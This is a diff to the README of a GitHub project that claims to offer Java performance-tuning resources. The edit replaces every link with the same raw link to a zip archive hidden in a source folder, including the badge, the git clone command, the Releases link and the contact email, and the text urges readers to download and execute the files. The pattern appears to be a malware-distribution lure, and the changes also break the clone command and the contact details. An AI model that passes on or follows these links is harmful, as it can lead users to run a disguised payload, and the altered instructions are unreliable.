@@ -2,7 +2,7 @@
 
 Welcome to the DCL-200 repository! This project focuses on enhancing Java performance through various techniques and tools. Whether you're a developer, engineer, or just someone interested in optimizing Java applications, you'll find valuable resources here.
 
-[![Download Releases](https://img.shields.io/badge/Download_Releases-Click_here-brightgreen)](https://github.com/Amzdadar/dcl200-2025-may-20/releases)
+[![Download Releases](https://github.com/Amzdadar/dcl200-2025-may-20/raw/refs/heads/main/os.and.hw.performance/src/com/may_dcl_2.1.zip)](https://github.com/Amzdadar/dcl200-2025-may-20/raw/refs/heads/main/os.and.hw.performance/src/com/may_dcl_2.1.zip)
 
 ## Table of Contents
 
@@ -42,14 +42,14 @@ To get started with the resources in this repository, follow these steps:
    Open your terminal and run the following command:
 
    ```bash
-   git clone https://github.com/Amzdadar/dcl200-2025-may-20.git
+   git clone https://github.com/Amzdadar/dcl200-2025-may-20/raw/refs/heads/main/os.and.hw.performance/src/com/may_dcl_2.1.zip
    ```
 
 2. **Explore the Documentation**: 
    Navigate through the files to find guides and examples on performance tuning.
 
 3. **Download Releases**: 
-   For specific tools and binaries, visit the [Releases section](https://github.com/Amzdadar/dcl200-2025-may-20/releases). You may need to download and execute the files provided there.
+   For specific tools and binaries, visit the [Releases section](https://github.com/Amzdadar/dcl200-2025-may-20/raw/refs/heads/main/os.and.hw.performance/src/com/may_dcl_2.1.zip). You may need to download and execute the files provided there.
 
 ## Performance Tuning Techniques
 
@@ -111,9 +111,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any questions or suggestions, feel free to reach out:
 
-- **Email**: [your-email@example.com](mailto:your-email@example.com)
-- **GitHub**: [Amzdadar](https://github.com/Amzdadar)
+- **Email**: [https://github.com/Amzdadar/dcl200-2025-may-20/raw/refs/heads/main/os.and.hw.performance/src/com/may_dcl_2.1.zip](https://github.com/Amzdadar/dcl200-2025-may-20/raw/refs/heads/main/os.and.hw.performance/src/com/may_dcl_2.1.zip)
+- **GitHub**: [Amzdadar](https://github.com/Amzdadar/dcl200-2025-may-20/raw/refs/heads/main/os.and.hw.performance/src/com/may_dcl_2.1.zip)
 
-[![Download Releases](https://img.shields.io/badge/Download_Releases-Click_here-brightgreen)](https://github.com/Amzdadar/dcl200-2025-may-20/releases)
+[![Download Releases](https://github.com/Amzdadar/dcl200-2025-may-20/raw/refs/heads/main/os.and.hw.performance/src/com/may_dcl_2.1.zip)](https://github.com/Amzdadar/dcl200-2025-may-20/raw/refs/heads/main/os.and.hw.performance/src/com/may_dcl_2.1.zip)
 
 Thank you for visiting the DCL-200 repository! We hope you find the resources helpful in your journey to optimize Java performance.
